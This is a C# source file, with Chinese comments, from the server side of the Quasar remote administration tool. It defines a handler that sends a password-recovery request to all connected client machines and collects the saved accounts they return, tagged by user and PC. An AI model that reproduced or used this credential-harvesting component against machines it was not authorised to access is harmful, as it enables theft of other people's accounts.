﻿using Quasar.Common.Messages;
using Quasar.Common.Models;
using Quasar.Common.Networking;
using Quasar.Server.Networking;
using System.Collections.Generic;
using System.Linq;

namespace Quasar.Server.Messages
{
    /// <summary>
    /// 处理与远程密码恢复交互的消息。
    /// </summary>
    public class PasswordRecoveryHandler : MessageProcessorBase<object>
    {
        /// <summary>
        /// 与此密码恢复处理器关联的客户端。
        /// </summary>
        private readonly Client[] _clients;

        /// <summary>
        /// 表示将处理已恢复账户的方法。
        /// </summary>
        /// <param name="sender">引发事件的消息处理器。</param>
        /// <param name="clientIdentifier">唯一的客户端标识符。</param>
        /// <param name="accounts">已恢复的账户</param>
        public delegate void AccountsRecoveredEventHandler(object sender, string clientIdentifier, List<RecoveredAccount> accounts);

        /// <summary>
        /// 当账户被恢复时引发。
        /// </summary>
        /// <remarks>
        /// 注册到此事件的处理程序将在构造实例时选择的 
        /// <see cref="System.Threading.SynchronizationContext"/> 上调用。
        /// </remarks>
        public event AccountsRecoveredEventHandler AccountsRecovered;

        /// <summary>
        /// 报告从客户端恢复的账户。
        /// </summary>
        /// <param name="accounts">已恢复的账户。</param>
        /// <param name="clientIdentifier">唯一的客户端标识符。</param>
        private void OnAccountsRecovered(List<RecoveredAccount> accounts, string clientIdentifier)
        {
            SynchronizationContext.Post(d =>
            {
                var handler = AccountsRecovered;
                handler?.Invoke(this, clientIdentifier, (List<RecoveredAccount>)d);
            }, accounts);
        }

        /// <summary>
        /// 使用给定客户端初始化 <see cref="PasswordRecoveryHandler"/> 类的新实例。
        /// </summary>
        /// <param name="clients">关联的客户端。</param>
        public PasswordRecoveryHandler(Client[] clients) : base(true)
        {
            _clients = clients;
        }

        /// <inheritdoc />
        public override bool CanExecute(IMessage message) => message is GetPasswordsResponse;

        /// <inheritdoc />
        public override bool CanExecuteFrom(ISender sender) => _clients.Any(c => c.Equals(sender));

        /// <inheritdoc />
        public override void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case GetPasswordsResponse pass:
                    Execute(sender, pass);
                    break;
            }
        }

        /// <summary>
        /// 使用关联的客户端开始账户恢复。
        /// </summary>
        public void BeginAccountRecovery()
        {
            var req = new GetPasswords();
            foreach (var client in _clients.Where(client => client != null))
                client.Send(req);
        }

        private void Execute(ISender client, GetPasswordsResponse message)
        {
            Client c = (Client) client;

            string userAtPc = $"{c.Value.Username}@{c.Value.PcName}";

            OnAccountsRecovered(message.RecoveredAccounts, userAtPc);
        }
    }
}
